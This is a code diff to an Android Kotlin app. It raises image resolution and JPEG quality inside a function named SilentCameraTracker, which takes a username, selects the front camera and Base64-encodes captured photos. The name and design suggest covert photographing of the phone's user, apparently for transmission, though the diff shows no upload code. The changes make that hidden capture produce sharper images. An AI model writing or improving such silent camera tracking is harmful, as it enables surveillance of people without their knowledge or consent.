@@ -85,6 +85,8 @@ import androidx.camera.core.CameraSelector
 import androidx.camera.core.ImageCapture
 import androidx.camera.core.ImageCaptureException
 import androidx.camera.core.ImageProxy
+import androidx.camera.core.resolutionselector.ResolutionSelector
+import androidx.camera.core.resolutionselector.ResolutionStrategy
 import androidx.camera.core.Preview
 import androidx.camera.lifecycle.ProcessCameraProvider
 import androidx.camera.view.PreviewView
@@ -4022,7 +4024,7 @@ fun imageProxyToBitmap(image: ImageProxy): Bitmap? {
             if (rotationDegrees != 0) {
                 matrix.postRotate(rotationDegrees.toFloat())
             }
-            val maxDimension = 1600f
+            val maxDimension = 3200f
             val scale = maxDimension / maxOf(bitmap.width, bitmap.height)
             if (scale < 1.0f) {
                 matrix.postScale(scale, scale)
@@ -4037,7 +4039,7 @@ fun imageProxyToBitmap(image: ImageProxy): Bitmap? {
 
 fun bitmapToBase64(bitmap: Bitmap): String {
     val outputStream = ByteArrayOutputStream()
-    bitmap.compress(Bitmap.CompressFormat.JPEG, 90, outputStream)
+    bitmap.compress(Bitmap.CompressFormat.JPEG, 95, outputStream)
     val bytes = outputStream.toByteArray()
     return Base64.encodeToString(bytes, Base64.NO_WRAP)
 }
@@ -4073,7 +4075,12 @@ fun SilentCameraTracker(username: String) {
                 }
 
                 val capture = ImageCapture.Builder()
-                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
+                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MAXIMIZE_QUALITY)
+                    .setResolutionSelector(
+                        ResolutionSelector.Builder()
+                            .setResolutionStrategy(ResolutionStrategy.HIGHEST_AVAILABLE_STRATEGY)
+                            .build()
+                    )
                     .build()
 
                 val cameraSelector = if (cameraProvider.hasCamera(CameraSelector.DEFAULT_FRONT_CAMERA)) {
